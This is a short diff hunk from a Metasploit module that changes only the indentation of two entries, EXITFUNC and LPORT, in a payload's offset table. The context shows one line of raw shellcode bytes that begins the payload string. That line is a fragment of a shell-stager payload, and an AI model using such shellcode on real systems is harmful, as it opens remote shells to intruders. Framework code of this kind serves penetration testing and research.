@@ -34,8 +34,8 @@ module Metasploit3
 				{
 					'Offsets' =>
 						{
-							 'EXITFUNC' => [ 290, 'V' ],
-							 'LPORT'    => [ 190, 'v' ], # Not a typo, really little endian
+							'EXITFUNC' => [ 290, 'V' ],
+							'LPORT'    => [ 190, 'v' ], # Not a typo, really little endian
 						},
 					'Payload' =>
 						"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
